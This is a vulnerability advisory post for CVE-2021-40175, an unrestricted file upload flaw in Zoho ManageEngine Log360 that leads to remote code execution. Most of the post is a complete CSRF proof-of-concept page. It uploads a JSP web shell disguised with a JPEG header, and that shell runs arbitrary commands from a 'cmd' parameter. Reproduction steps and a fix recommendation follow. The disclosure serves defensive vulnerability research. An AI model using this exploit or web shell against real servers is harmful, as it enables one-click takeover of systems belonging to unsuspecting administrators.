---
layout: post
title:  "Zoho ManageEngine Log360 - Remote Code Execution via Arbitrary File Upload"
tag: advisory
excerpt_separator: <!--more-->

---

Zoho ManageEngine Log360 before Build 5219 allows unrestricted file upload with resultant remote code execution.  
<!--more-->

### **Identifiers**
 - CVE-2021-40175

### **Affected versions**
 - 5.2.1

### **Affected Instance(s)**
 - /RestAPI/WC/ADSPersonalize?mTCall=updatePersonalizeSettings

### **Advisory URL**
 - https://www.manageengine.com/log-management/readme.html#Build%205219

### **Technical details**
Zoho ManageEngine Log360 application do not validate the file content-type while uploading the logo/icon files from admin panel. This allows an authenticated attacker to execute arbitrary code on the server by uploading jsp files.



### **Impact**:
As the endpoint also does not implement CSRF protection, the above attack can be easily carried out as 1-click remote code execution using the following exploit code.

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/127.0.0.1:8095\/RestAPI\/WC\/ADSPersonalize?mTCall=updatePersonalizeSettings", true);
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------14802732823662");
        xhr.withCredentials = true;
        var body = "-----------------------------14802732823662\r\n" + 
          "Content-Disposition: form-data; name=\"LOGO_PATH\"; filename=\"shell.jpg.jsp\"\r\n" + 
          "Content-Type: image/jpeg\r\n" + 
          "\r\n" + 
          "\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x01,\x01,\x00\x00\xff\xe1\x00fExif\x00\x00MM\x00*\x00\x00\x00\x08\x00\x04\x01\x1a\x00\x05\x00\x00\x00\x01\x00\x00\x00\x3e\x01\x1b\x00\x05\x00\x00\x00\x01\x00\x00\x00F\x01(\x00\x03\x00\x00\x00\x01\x00\x02\x00\x00\x011\x00\x02\x00\x00\x00\x10\x00\x00\x00N\x00\x00\x00\x00\x00\x00\x01,\x00\x00\x00\x01\x00\x00\x01,\x00\x00\x00\x01paint.ne\x84\xff\x00\xf0\xc3\xdf\xf0\x8f\x7f\xc2\xcf\xf8\x0f\xf1\x7f\xe1\xe7\xf6\xff\x00\xfc4\xb7\xf6\xb7\xf6\x1f\xfc&\xbf\x0f\xbcC\xe1\xaf\xed\x8f\xec\xaf\xf8P\x1ag\xf6\x9f\xf6g\xf6\x9f\xdb\x7f\xb3\xff\x00\xb4\xb4\xff\x00\xb6y\x1ff\xfbm\xa7\x99\xe7\xc6P\x07\xff\xd9\r\n" + 
          "\x3c%@ page import=\"java.util.*,java.io.*\"%\x3e\r\n" + 
          "\x3c%\r\n" + 
          "%\x3e\r\n" + 
          "\x3cHTML\x3e\x3cBODY\x3e\r\n" + 
          "Commands with JSP\r\n" + 
          "\x3cFORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"\x3e\r\n" + 
          "\x3cINPUT TYPE=\"text\" NAME=\"cmd\"\x3e\r\n" + 
          "\x3cINPUT TYPE=\"submit\" VALUE=\"Send\"\x3e\r\n" + 
          "\x3c/FORM\x3e\r\n" + 
          "\x3cpre\x3e\r\n" + 
          "\x3c%\r\n" + 
          "if (request.getParameter(\"cmd\") != null) {\r\n" + 
          "    out.println(\"Command: \" + request.getParameter(\"cmd\") + \"\x3cBR\x3e\");\r\n" + 
          "    Process p;\r\n" + 
          "    if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\r\n" + 
          "        p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\"));\r\n" + 
          "    }\r\n" + 
          "    else{\r\n" + 
          "        p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\r\n" + 
          "    }\r\n" + 
          "    OutputStream os = p.getOutputStream();\r\n" + 
          "    InputStream in = p.getInputStream();\r\n" + 
          "    DataInputStream dis = new DataInputStream(in);\r\n" + 
          "    String disr = dis.readLine();\r\n" + 
          "    while ( disr != null ) {\r\n" + 
          "    out.println(disr);\r\n" + 
          "    disr = dis.readLine();\r\n" + 
          "    }\r\n" + 
          "}\r\n" + 
          "%\x3e\r\n" + 
          "\x3c/pre\x3e\r\n" + 
          "\x3c/BODY\x3e\x3c/HTML\x3e\r\n" + 
          "-----------------------------14802732823662\r\n" + 
          "Content-Disposition: form-data; name=\"BROWSER_TITLE\"\r\n" + 
          "\r\n" + 
          "ManageEngine Log360\r\n" + 
          "-----------------------------14802732823662\r\n" + 
          "Content-Disposition: form-data; name=\"FAVICON_PATH\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------14802732823662\r\n" + 
          "Content-Disposition: form-data; name=\"ENABLE_FORGOT_PWD\"\r\n" + 
          "\r\n" + 
          "true\r\n" + 
          "-----------------------------14802732823662\r\n" + 
          "Content-Disposition: form-data; name=\"SELECT_LANGUAGE\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
          "-----------------------------14802732823662\r\n" + 
          "Content-Disposition: form-data; name=\"TIME_ZONE\"\r\n" + 
          "\r\n" + 
          "Asia/Muscat\r\n" + 
          "-----------------------------14802732823662\r\n" + 
          "Content-Disposition: form-data; name=\"DATE_TIME_FORMAT\"\r\n" + 
          "\r\n" + 
          "yyyy/MM/dd HH:mm:ss\r\n" + 
          "-----------------------------14802732823662\r\n" + 
          "Content-Disposition: form-data; name=\"THEME_COLOR\"\r\n" + 
          "\r\n" + 
          "green\r\n" + 
          "-----------------------------14802732823662--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
      submitRequest();
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
```



### **Steps to reproduce**
* Execute the POC code with authenticated admin session and observe that a jsp file is uploaded to /images/adsf/common/logos/.

* Upon accessing the uploaded JSP file, the application executes arbitrary code.
  ![](/assets/images/CVE-2021-40175/1.png)

### **Recommendation**
It is recommended to only allow white-listed file extensions to be uploaded on the server. Also store the images outside of the web root with disabled jsp file execution permissions.